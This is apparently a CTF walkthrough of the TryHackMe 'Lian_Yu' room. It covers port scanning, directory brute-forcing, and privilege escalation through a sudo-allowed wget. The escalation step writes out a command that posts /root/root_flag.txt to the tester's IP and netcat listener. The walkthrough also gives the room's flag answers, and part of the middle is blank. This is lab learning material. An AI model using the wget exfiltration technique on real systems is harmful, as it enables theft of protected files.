# Lian\_Yu

<div align="left">

<figure><img src=".gitbook/assets/image (76).png" alt="" width="375"><figcaption><p><a href="https://tryhackme.com/room/lianyu">https://tryhackme.com/room/lianyu</a></p></figcaption></figure>

</div>

🔗 [Lian\_Yu](https://tryhackme.com/room/lianyu)

### Task 1 - Deploy the machine

🎯 Target IP: `10.10.95.230`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

<pre class="language-bash"><code class="lang-bash">su
echo "10.10.95.230 lian_yu.thm" >> /etc/hosts

mkdir thm/lian_yu
cd thm/lian_yu
mkdir {nmap,content,exploits,scripts}

# At the end of the room
# To clean up the last line from the /etc/hosts file
<strong>sed -i '$ d' /etc/hosts
</strong></code></pre>

I prefer to start recon by pinging the target, this allows us to check connectivity and get OS info.

```bash
ping -c 3 lian_yu.thm
PING lian_yu.thm (10.10.95.230) 56(84) bytes of data.
64 bytes from lian_yu.thm (10.10.95.230): icmp_seq=1 ttl=63 time=66.7 ms
64 bytes from lian_yu.thm (10.10.95.230): icmp_seq=2 ttl=63 time=62.1 ms
64 bytes from lian_yu.thm (10.10.95.230): icmp_seq=3 ttl=63 time=62.6 ms
```

Sending these three ICMP packets, we see that the Time To Live (TTL) is \~64 secs. this indicates that the target is a \*nix, while Windows systems usually have a TTL of 128 secs.

Of course, start to check information scanning open ports:

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 lian_yu.thm -oG nmap/port_scan
```

```bash
PORT      STATE SERVICE REASON
21/tcp    open  ftp     syn-ack ttl 63
22/tcp    open  ssh     syn-ack ttl 63
80/tcp    open  http    syn-ack ttl 63
111/tcp   open  rpcbind syn-ack ttl 63
52286/tcp open  unknown syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

It looks like there are 5 open ports on the machine: 21,22,80,111,52286.

Now, we need to search which services are running on open ports:

```bash
nmap -p21,22,80,111,52286 -n -Pn -vvv -sCV --min-rate 5000 lian_yu.thm -oN nmap/open_port
```

```bash
PORT      STATE SERVICE REASON         VERSION
21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.2
22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
| ssh-dss AAAAB3NzaC1kc3MAAACBAOZ67Cx0AtDwHfVa7iZw6O6htGa3GHwfRFSIUYW64PLpGRAdQ734COrod9T+pyjAdKscqLbUAM7xhSFpHFFGM7NuOwV+d35X8CTUM882eJX+t3vhEg9d7ckCzNuPnQSpeUpLuistGpaP0HqWTYjEncvDC0XMYByf7gbqWWU2pe9HAAAAFQDWZIJ944u1Lf3PqYCVsW48Gm9qCQAAAIBfWJeKF4FWRqZzPzquCMl6Zs/y8od6NhVfJyWfi8APYVzR0FR05YCdS2OY4C54/tI5s6i4Tfpah2k+fnkLzX74fONcAEqseZDOffn5bxS+nJtCWpahpMdkDzz692P6ffDjlSDLNAPn0mrJuUxBFw52Rv+hNBPR7SKclKOiZ86HnQAAAIAfWtiPHue0Q0J7pZbLeO8wZ9XNoxgSEPSNeTNixRorlfZBdclDDJcNfYkLXyvQEKq08S1rZ6eTqeWOD4zGLq9i1A+HxIfuxwoYp0zPodj3Hz0WwsIB2UzpyO4O0HiU6rvQbWnKmUaH2HbGtqJhYuPr76XxZtwK4qAeFKwyo87kzg==
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDRbgwcqyXJ24ulmT32kAKmPww+oXR6ZxoLeKrtdmyoRfhPTpCXdocoj0SqjsETI8H0pR0OVDQDMP6lnrL8zj2u1yFdp5/bDtgOnzfd+70Rul+G7Ch0uzextmZh7756/VrqKn+rdEVWTqqRkoUmI0T4eWxrOdN2vzERcvobqKP7BDUm/YiietIEK4VmRM84k9ebCyP67d7PSRCGVHS218Z56Z+EfuCAfvMe0hxtrbHlb+VYr1ACjUmGIPHyNeDf2430rgu5KdoeVrykrbn8J64c5wRZST7IHWoygv5j9ini+VzDhXal1H7l/HkQJKw9NSUJXOtLjWKlU4l+/xEkXPxZ
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPfrP3xY5XGfIk2+e/xpHMTfLRyEjlDPMbA5FLuasDzVbI91sFHWxwY6fRD53n1eRITPYS1J6cBf+QRtxvjnqRg=
|   256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDexCVa97Otgeg9fCD4RSvrNyB8JhRKfzBrzUMe3E/Fn
80/tcp    open  http    syn-ack ttl 63 Apache httpd
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp   open  rpcbind syn-ack ttl 63 2-4 (RPC #100000)
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
52286/tcp open  status  syn-ack ttl 63 1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Task 3 - Find the flags

### 3.1 What is the Web Directory you found?

Then we can start to see website (port 80):

<div align="left">

<figure><img src=".gitbook/assets/image (79).png" alt=""><figcaption></figcaption></figure>

</div>

We find this info in the footer of website:

> Note: Hi Everyone, I am a huge fan to Arrowverse, I built this vm concept based on Arrow (first season) you will find a few things similar here and I posted this Content here just to entertain you, To complete this CTF it isn't mandatory to have knowledge on Arrrowverse series. I hope you will Enjoy the content and have fun :).

We continue exploring web source code to find eventual information disclosure.

<figure><img src=".gitbook/assets/image (78).png" alt=""><figcaption></figcaption></figure>

No other informations, another good thing to do, is find hidden paths on website using gobuster

```bash
gobuster dir -u lian_yu.thm -w /usr/share/wordlists/dirb/common.txt
```

<div align="left">

<figure><img src=".gitbook/assets/image (80).png" alt=""><figcaption></figcaption></figure>

</div>

Very bad, we find only index page that we've just see.

We can try to use a bigger wordlist such as big.txt

```bash
gobuster dir -u lian_yu.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

gobuster dir -u lian\_yu.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt





Excellent! We find a new web path: /island, search it!

<figure><img src=".gitbook/assets/image (82).png" alt=""><figcaption></figcaption></figure>

Note this code word: _vigilante._

We can try to retake another dirbuster search starting with island/ web path:

```bash
gobuster dir -u lian_yu.thm/island/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

<div align="left">

<figure><img src=".gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

</div>

Then, we can answer at first question.

{% hint style="info" %}
2100
{% endhint %}

### 3.2 What is the file name you found? 









<figure><img src=".gitbook/assets/image (83).png" alt=""><figcaption></figcaption></figure>

Viewing source code:

<div align="left">

<figure><img src=".gitbook/assets/image (89).png" alt=""><figcaption></figcaption></figure>

</div>









\






































```bash
find / -type f -iname "*flag.txt" 2>/dev/null
```

<figure><img src=".gitbook/assets/image (42).png" alt=""><figcaption></figcaption></figure>

<details>

<summary>🚩 Flag 1 (user_flag.txt)</summary>

057c67131c3d5e42dd5cd3075b198ff6

</details>

### Task 4 - What are the contents of root.txt?

We can do sudo -l command to discover user's permissions.

<figure><img src=".gitbook/assets/image (49).png" alt=""><figcaption></figcaption></figure>

We can run /usr/bin/wget as root. Perfect, time to go to GTFOBins ([https://gtfobins.github.io/](https://gtfobins.github.io/)) and find our exploit.&#x20;

<figure><img src=".gitbook/assets/image (43).png" alt=""><figcaption><p><a href="https://gtfobins.github.io/gtfobins/wget/">https://gtfobins.github.io/gtfobins/wget/</a></p></figcaption></figure>

<div align="left">

<figure><img src=".gitbook/assets/image (50).png" alt=""><figcaption></figcaption></figure>

</div>

unfortunately, it doesn't work!

Checking on google, we find this good article that suggests to use post-file option of wget  command, to send the content of any file.

<figure><img src=".gitbook/assets/image (44).png" alt=""><figcaption><p><a href="https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-wget-privilege-escalation/</a></p></figcaption></figure>

More probably root flag there're in root path and its name will be similar than user\_flag.txt, then, we can try to setting post-file option: —post-file=/root/root\_flag.txt, add our IP and open a listen session with netcat to receive file.

<figure><img src=".gitbook/assets/image (54).png" alt=""><figcaption><p>find IP and listen on port 4444</p></figcaption></figure>

```bash
sudo /usr/bin/wget http://10.9.80.228:4444 --post-file=/root/root_flag.txt
```

<figure><img src=".gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

<div align="left">

<figure><img src=".gitbook/assets/image (53).png" alt=""><figcaption></figcaption></figure>

</div>

Well done! Root flag found!

<details>

<summary>🚩 Flag 2 (root_flag.txt)</summary>

b1b968b37519ad1daa6408188649263d

</details>
